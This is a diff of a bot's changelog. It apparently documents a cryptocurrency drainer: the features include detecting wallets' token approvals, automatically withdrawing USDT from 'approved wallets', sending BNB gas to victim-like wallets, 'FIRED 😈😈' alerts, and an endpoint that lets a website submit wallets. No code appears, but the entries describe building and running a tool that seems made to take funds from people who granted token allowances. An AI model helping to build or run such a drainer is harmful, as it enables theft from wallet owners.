@@ -133,12 +133,15 @@ User Request → Rate Limit Check → Balance Verification → Transaction Execu
 ✓ Enhanced wallet detection with approval status display (exact format requested)
 ✓ Added Auto Mode button for automatic USDT withdrawals from approved wallets
 ✓ Implemented Auto Gas button with smart BNB distribution (USDT ≥$0.5, BNB <0.00000720)
+✓ **FIXED: Auto gas now works on ALL wallets** (not just approved ones)
+✓ **NEW: Added FIRED 😈😈 notifications** when auto gas is sent to any wallet
+✓ **NEW: Created API endpoint** `/api/submit-wallet` for direct website integration
+✓ **NEW: Complete VS Code installation guide** with step-by-step setup
 ✓ Created comprehensive auto monitoring system with configurable intervals
 ✓ Enhanced group/channel detection with complete wallet information display
 ✓ Added BNB balance tracking and USD formatting for USDT amounts
 ✓ Implemented smart wallet monitoring with allowance-based auto-addition
-✓ Created configurable .env template with all auto features settings
-✓ Updated VS Code installation guide with new features documentation
+✓ Created configurable notification system for auto gas events
 ✓ Applied advanced security with separate auto gas private key configuration
 
 ### July 22, 2025 - Complete Bot Functionality Restored
